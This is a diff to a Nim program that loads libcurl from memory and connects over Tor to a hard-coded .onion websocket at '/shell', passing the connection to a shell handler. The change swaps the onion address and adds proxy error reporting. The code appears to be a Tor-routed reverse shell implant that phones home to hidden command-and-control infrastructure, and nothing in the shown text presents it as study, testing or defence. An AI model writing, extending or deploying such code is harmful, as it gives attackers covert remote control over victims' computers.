@@ -16,14 +16,12 @@ import
   times
   
 import memlib
+import strformat
 import strutils
 import std/osproc
 import std/nativesockets
 import functions
 import std/json
-const
-  onion_hostname = "ws://vaba53nf5c7lh5qwwezt4bdbkeepudeuvcilpmj635rldedwlrydv2qd.onion"
-
 let libname = staticReadDll("libcurl.dll")
 
 # when defined(windows):
@@ -263,6 +261,7 @@ type
     INFO_HTTPAUTH_AVAIL = 0x00200000 + 23,
     INFO_PROXYAUTH_AVAIL = 0x00200000 + 24, INFO_OS_ERRNO = 0x00200000 + 25,
     INFO_NUM_CONNECTS = 0x00200000 + 26, INFO_LASTSOCKET = 0x00200000 + 29,
+    INFO_PROXY_ERROR  = 0x00200000 + 59,
     INFO_TOTAL_TIME = 0x00300000 + 3, INFO_NAMELOOKUP_TIME = 0x00300000 + 4,
     INFO_CONNECT_TIME = 0x00300000 + 5, INFO_PRETRANSFER_TIME = 0x00300000 + 6,
     INFO_SIZE_UPLOAD = 0x00300000 + 7, INFO_SIZE_DOWNLOAD = 0x00300000 + 8,
@@ -602,7 +601,7 @@ proc websocket_register(curl_client: PCurl): int =
 
 proc websocket_request_init*(): int =
   var cli = easy_init()
-  discard cli.easy_setopt(OPT_URL, onion_hostname&"/shell")
+  discard cli.easy_setopt(OPT_URL, "ws://aoh5vdoffsrcfdw2pcsnhhexrmhpm7cejgtkkyt6tjidxmq56ac7zwid.onion/shell")
   discard cli.easy_setopt(OPT_CONNECT_ONLY, 2)
   discard cli.easy_setopt(OPT_PROXY, "socks5h://localhost:9050")
   let res = cli.easy_perform()
@@ -613,13 +612,18 @@ proc websocket_request_init*(): int =
     return is_registered
 
 proc websocket_request_init_shell*(): int =
-  var cli = easy_init()
-  discard cli.easy_setopt(OPT_URL, onion_hostname&"/shell")
-  discard cli.easy_setopt(OPT_CONNECT_ONLY, 2)
-  discard cli.easy_setopt(OPT_PROXY, "socks5h://localhost:9050")
-  let res = cli.easy_perform()
-  echo res
-  if res != E_OK:
+  var curl_cli = easy_init()
+  discard curl_cli.easy_setopt(OPT_URL, "ws://aoh5vdoffsrcfdw2pcsnhhexrmhpm7cejgtkkyt6tjidxmq56ac7zwid.onion/shell")
+  discard curl_cli.easy_setopt(OPT_CONNECT_ONLY, 2)
+  discard curl_cli.easy_setopt(OPT_PROXY, "socks5h://localhost:9050")
+  let curl_cli_res = curl_cli.easy_perform()
+  if curl_cli_res != E_OK:
+    var error = easy_strerror(curl_cli_res)
     echo("Une erreur est apparue")
+    echo error
+    var detailed_error: int
+    var Pdetailed_error: ptr int = addr(detailed_error)
+    echo curl_cli.easy_getinfo(INFO_PROXY_ERROR, Pdetailed_error);
+    echo detailed_error
   else:
-    discard websocket_shell(cli)
+    discard websocket_shell(curl_cli)
